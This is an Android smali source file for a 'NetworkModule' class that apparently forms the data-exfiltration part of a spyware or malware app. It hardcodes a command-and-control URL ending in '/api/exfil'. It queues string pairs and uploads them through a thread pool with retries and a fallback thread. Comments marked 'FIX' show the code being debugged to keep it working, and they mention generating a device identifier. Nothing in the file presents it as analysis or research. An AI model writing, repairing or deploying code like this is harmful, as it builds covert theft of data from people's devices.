.class public Lcom/smilex/enhanced/modules/NetworkModule;
.super Ljava/lang/Object;
.source "NetworkModule.java"

.field private static final C2_URL:Ljava/lang/String; = "https://smilex-c2.onrender.com/api/exfil"
.field private static sPendingUploads:Ljava/util/List; = null
.field private static final sPendingLock:Ljava/lang/Object; = null
.field private static sExecutor:Ljava/util/concurrent/ExecutorService; = null
.field private static sRetryCount:I = 0x3
# FIX: Added sContext so NetworkModule$1 can call CryptoUtils.generateDeviceId(Context)
.field private static sContext:Landroid/content/Context;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method static constructor <clinit>()V
    .registers 2
    new-instance v0, Ljava/util/ArrayList;
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V
    sput-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sPendingUploads:Ljava/util/List;
    new-instance v0, Ljava/lang/Object;
    invoke-direct {v0}, Ljava/lang/Object;-><init>()V
    sput-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sPendingLock:Ljava/lang/Object;
    const/4 v0, 0x3
    sput v0, Lcom/smilex/enhanced/modules/NetworkModule;->sRetryCount:I
    return-void
.end method

.method public static init(Landroid/content/Context;)V
    .registers 4
    # FIX: Store application context for use in NetworkModule$1
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;
    move-result-object v0
    sput-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sContext:Landroid/content/Context;
    # FIX: Inverted null check — only init executor if it is null (not already running)
    sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sExecutor:Ljava/util/concurrent/ExecutorService;
    if-nez v0, :return
    const/4 v0, 0x3
    invoke-static {v0}, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;
    move-result-object v0
    sput-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sExecutor:Ljava/util/concurrent/ExecutorService;
    :return
    return-void
.end method

.method public static flushPendingUploads(Landroid/content/Context;)V
    .registers 6
    sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sPendingLock:Ljava/lang/Object;
    monitor-enter v0
    :try_start
    sget-object v1, Lcom/smilex/enhanced/modules/NetworkModule;->sPendingUploads:Ljava/util/List;
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z
    move-result v1
    if-nez v1, :no_pending
    new-instance v1, Ljava/util/ArrayList;
    sget-object v2, Lcom/smilex/enhanced/modules/NetworkModule;->sPendingUploads:Ljava/util/List;
    invoke-direct {v1, v2}, Ljava/util/ArrayList;-><init>(Ljava/util/Collection;)V
    sget-object v2, Lcom/smilex/enhanced/modules/NetworkModule;->sPendingUploads:Ljava/util/List;
    invoke-interface {v2}, Ljava/util/List;->clear()V
    monitor-exit v0
    invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;
    move-result-object v2
    :loop
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z
    move-result v3
    if-eqz v3, :end
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;
    move-result-object v3
    check-cast v3, [Ljava/lang/String;
    const/4 v4, 0x0
    aget-object v4, v3, v4
    const/4 v5, 0x1
    aget-object v5, v3, v5
    invoke-static {v4, v5}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    goto :loop
    :no_pending
    monitor-exit v0
    :end
    return-void
    :catch_all
    move-exception v1
    monitor-exit v0
    throw v1
.end method

.method public static sendData(Ljava/lang/String;Ljava/lang/String;)V
    .registers 5
    sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sExecutor:Ljava/util/concurrent/ExecutorService;
    if-eqz v0, :fallback
    new-instance v0, Lcom/smilex/enhanced/modules/NetworkModule$1;
    invoke-direct {v0, p0, p1}, Lcom/smilex/enhanced/modules/NetworkModule$1;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    sget-object v1, Lcom/smilex/enhanced/modules/NetworkModule;->sExecutor:Ljava/util/concurrent/ExecutorService;
    invoke-interface {v1, v0}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V
    goto :return
    :fallback
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/smilex/enhanced/modules/NetworkModule$1;
    invoke-direct {v1, p0, p1}, Lcom/smilex/enhanced/modules/NetworkModule$1;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :return
    return-void
.end method

.method public static queueForUpload(Ljava/lang/String;Ljava/lang/String;)V
    .registers 4
    sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sPendingLock:Ljava/lang/Object;
    monitor-enter v0
    :try_start
    const/4 v1, 0x2
    new-array v1, v1, [Ljava/lang/String;
    const/4 v2, 0x0
    aput-object p0, v1, v2
    const/4 v2, 0x1
    aput-object p1, v1, v2
    sget-object v2, Lcom/smilex/enhanced/modules/NetworkModule;->sPendingUploads:Ljava/util/List;
    invoke-interface {v2, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z
    monitor-exit v0
    return-void
    :catch_all
    move-exception v1
    monitor-exit v0
    throw v1
.end method

.method public static getRetryCount()I
    .registers 1
    sget v0, Lcom/smilex/enhanced/modules/NetworkModule;->sRetryCount:I
    return v0
.end method

.method static synthetic access$000()Ljava/lang/String;
    .registers 1
    sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->C2_URL:Ljava/lang/String;
    return-object v0
.end method

# FIX: Synthetic accessor so NetworkModule$1 can read sContext
.method static synthetic access$001()Landroid/content/Context;
    .registers 1
    sget-object v0, Lcom/smilex/enhanced/modules/NetworkModule;->sContext:Landroid/content/Context;
    return-object v0
.end method
